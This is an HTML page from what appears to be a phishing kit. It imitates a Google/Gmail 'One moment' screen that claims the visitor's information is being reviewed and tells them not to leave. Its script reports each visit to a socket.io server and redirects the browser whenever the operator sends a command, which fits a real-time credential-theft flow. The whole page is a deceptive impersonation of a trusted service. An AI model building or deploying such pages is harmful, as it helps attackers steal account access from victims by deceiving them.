<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - One Moment</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #202124;
        }
        
        .loading-container {
            text-align: center;
            padding: 60px 40px;
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 1px 2px rgba(60, 64, 67, 0.15);
            max-width: 500px;
            width: 90%;
        }
        
        .logo-container {
            margin-bottom: 35px;
        }
        
        .google-logo {
            display: inline-flex;
            align-items: center;
            gap: 2px;
            font-size: 36px;
            font-weight: 400;
        }
        
        .g-blue { color: #4285f4; }
        .g-red { color: #ea4335; }
        .g-yellow { color: #fbbc04; }
        .g-green { color: #34a853; }
        
        .gmail-text {
            font-size: 24px;
            color: #5f6368;
            margin-left: 8px;
        }
        
        .loading-text {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 35px;
            color: #202124;
        }
        
        .loading-bar-container {
            width: 100%;
            height: 4px;
            background: #e8eaed;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 40px;
        }
        
        .loading-bar {
            height: 100%;
            background: linear-gradient(90deg, #4285f4, #34a853, #fbbc04, #ea4335);
            background-size: 400% 100%;
            animation: loading 2s ease-in-out infinite;
            width: 100%;
        }
        
        .status-text {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.6;
            max-width: 380px;
            margin: 0 auto 20px;
        }
        
        .warning-container {
            margin-top: 35px;
            padding: 16px;
            background: #fef7e0;
            border-radius: 8px;
            border: 1px solid #f9e8a8;
        }
        
        .warning-text {
            font-size: 13px;
            color: #8a6d00;
            font-weight: 500;
        }
        
        .footer-text {
            font-size: 12px;
            color: #80868b;
            margin-top: 40px;
        }
        
        @keyframes loading {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="logo-container">
            <div class="google-logo">
                <span class="g-blue">G</span>
                <span class="g-red">o</span>
                <span class="g-yellow">o</span>
                <span class="g-blue">g</span>
                <span class="g-green">l</span>
                <span class="g-red">e</span>
            </div>
        </div>
        
        <h1 class="loading-text">One moment</h1>
        
        <div class="loading-bar-container">
            <div class="loading-bar"></div>
        </div>
        
        <p class="status-text">We are currently reviewing your information to ensure the security for your account.</p>
        
        <p class="status-text">Please allow us some time to verify your data.</p>
        
        <div class="warning-container">
            <p class="warning-text"><strong>Important:</strong> DO NOT navigate away from this page during this process.</p>
        </div>
        
        <p class="footer-text">Thank you for your patience and understanding.</p>
    </div>
    
    <script src="/js/socket-client.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Socket connection handling
            if (typeof socket !== 'undefined') {
                socket.emit('page_visit', {
                    page: 'gmailloading',
                    timestamp: new Date().toISOString()
                });
                
                // Handle redirect events
                socket.on('redirect', (data) => {
                    if (data && data.page) {
                        window.location.href = `/pages/${data.page}`;
                    }
                });
            }
        });
    </script>
</body>
</html>
